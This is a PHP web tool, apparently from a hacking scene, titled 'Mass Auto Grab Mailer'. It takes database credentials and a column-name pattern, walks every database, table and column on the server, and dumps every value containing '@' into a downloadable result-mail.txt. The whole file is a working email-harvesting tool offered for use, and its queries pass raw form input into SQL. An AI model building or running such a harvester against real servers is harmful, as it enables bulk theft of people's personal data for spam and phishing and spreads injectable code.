<?php 



###############################################################
#                   MASS AUTO GRAB MAILER 
#       Coded by : Akazh ID
#       Facebook : https://facebook.com/justakazh
#       Github   : https://github.com/justakazh
#       *NB: Want to recode? dont forget to copyright!
################################################################        









?>

<!DOCTYPE html>
<html>
<head>
    <title>MASS MAIL GRABBER FROM DATABASE</title>
    <link href='http://nobsec.blogspot.com/favicon.ico' rel='icon' type='image/x-icon'/>
</head>
<style type="text/css">
    body{
        background-color: #333;
        font-family: arial, sans-serif;
        color: #eaeaea;
    }
    input{
        margin-bottom: 10px;
        padding: 10px;
    }
    a{
        color: #fff;
    }
    a:hover{
        color:lime;
    }
</style>
<body>
<center>
    <h1>MASS MAIL GRABBER FROM DATABASE</h1>
    <h3>Coded By: <a href="https://facebook.com/justakazh">Akazh ID</a></h3>
<form action="" method="POST">
    <input type="text" name="host" value="localhost" placeholder="HOST"><br>
    <input type="text" name="user" value="" placeholder="username"><br>
    <input type="text" name="pass" value=""placeholder="password"><br>
    <input type="text" name="db" value="" placeholder="db_name (Optional)"><br>
    <input type="text" name="hit" value="" placeholder="hit"><br>
    <button name="grab"type="submit" class="btn btn-sm btn-danger">Grab</button>
</form>

<?php
if (isset($_POST["grab"])) {
    $host = $_POST['host'];
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $db = $_POST['db'];
    $hit = $_POST['hit'];

    $conn = mysqli_connect($host, $user, $pass) or die("gagal  konek");
    $q1 = mysqli_query($conn, "SHOW DATABASES");
    echo "<br>";
    while ($database = mysqli_fetch_array($q1)) {
        $q2 = mysqli_query($conn, "SHOW TABLES FROM ".$database['Database']);
        while ($table  = mysqli_fetch_array($q2)) {
            $q3 = mysqli_query($conn, "SHOW COLUMNS FROM ".$database['Database'].".".$table["Tables_in_".$database['Database']]." IN ". $database['Database']);
            while ($columns = mysqli_fetch_array($q3)) {
                if(preg_match("/$hit/", $columns['Field'])){

                    $final_query = mysqli_query($conn, "SELECT ".$columns["Field"]." FROM ".$database['Database'].".".$table['Tables_in_'.$database['Database']]);
                    while ($email = mysqli_fetch_array($final_query)) {
                        if (strstr($email[$columns['Field']], "@")) {
                            $file = "result-mail.txt";
                            $f = fopen($file, "a");
                            fwrite($f, $email[$columns['Field']]."\n");
                        }
                    }

                }
            }
        }
    }
     echo "success <a href='result-mail.txt' target='_blank'>Click Here</a>";


}
?>
</center>

</body>
</html>
